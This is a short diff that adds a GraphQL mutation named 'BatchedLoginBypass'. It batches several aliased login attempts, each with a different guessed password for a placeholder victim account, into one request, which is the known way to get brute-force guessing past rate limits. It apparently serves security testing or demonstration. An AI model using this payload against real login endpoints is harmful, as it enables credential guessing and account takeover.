@@ -1,0 +1,6 @@
+mutation BatchedLoginBypass {
+  a1: login(email: "victim@example.com", password: "guess1") { token }
+  a2: login(email: "victim@example.com", password: "guess2") { token }
+  a3: login(email: "victim@example.com", password: "guess3") { token }
+  a4: login(email: "victim@example.com", password: "guess4") { token }
+}
